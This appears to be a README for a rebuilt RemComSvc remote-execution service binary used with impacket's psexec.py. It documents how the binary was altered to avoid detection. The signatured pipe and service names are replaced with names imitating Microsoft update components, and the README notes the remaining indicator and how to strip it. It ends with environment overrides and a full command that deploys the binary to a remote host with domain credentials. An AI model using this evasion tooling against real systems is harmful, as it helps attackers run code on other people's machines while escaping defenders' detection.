# RemComSvc-lowdetect.exe — renamed-pipe RemComSvc for psexec.py

A rebuild of [kavika13/RemCom](https://github.com/kavika13/RemCom)'s `RemComSvc`
service binary with the static, signatured pipe/service names renamed. Use it with
`psexec.py -file` plus the matching `IMPACKET_REMCOM_*` env overrides so the Python
client and the service binary agree on the renamed pipes.

See `docs/low-detection-remcom.md` for the full IOC enumeration and rationale.

## What was renamed

| Stock RemCom string | This binary |
|---|---|
| `RemCom_communicaton` (control pipe, *sic*) | `MsUpdate_ctl` |
| `RemCom_stdout` | `MsUpdate_out` |
| `RemCom_stdin`  | `MsUpdate_in`  |
| `RemCom_stderr` | `MsUpdate_err` |
| service name `RemComSvc` | `UpdateHealthSvc` |

All four original `RemCom_*` pipe strings are absent from the binary.

## Build provenance

- Source: `kavika13/RemCom`, `RemComSvc` project, all indicator strings in `RemCom.h`
  replaced as above.
- Toolchain: VS 2022 Build Tools, MSVC v143, Windows SDK 10.
- Config: `Release|Win32`, **static CRT (`/MT`)** — dependencies are `KERNEL32.dll`
  and `ADVAPI32.dll` only, no VC runtime to ship alongside.
- `sha256: 529b2f370ca6fa07e485f16a7da75b16bf12e20bcb89d44dff917375f3d5655e`

> Residual: the binary still embeds its PDB path string `...\RemComSvc.pdb`. It is a
> build-artefact path, not a pipe/service IOC; relink with `/DEBUG:NONE` to strip it.

## Usage

Override the client pipe constants to match this binary, then deliver it via `-file`:

```bash
export IMPACKET_REMCOM_PIPE=MsUpdate_ctl
export IMPACKET_REMCOM_STDOUT=MsUpdate_out
export IMPACKET_REMCOM_STDIN=MsUpdate_in
export IMPACKET_REMCOM_STDERR=MsUpdate_err

psexec.py -file tools/remcom-lowdetect/RemComSvc-lowdetect.exe \
          -service-name UpdateHealthSvc \
          -remote-binary-name uhsvc.exe \
          DOMAIN/user@host
```

The env overrides default to the stock `RemCom_*` names, so omitting them leaves
psexec.py behaviour unchanged against the embedded stock binary.
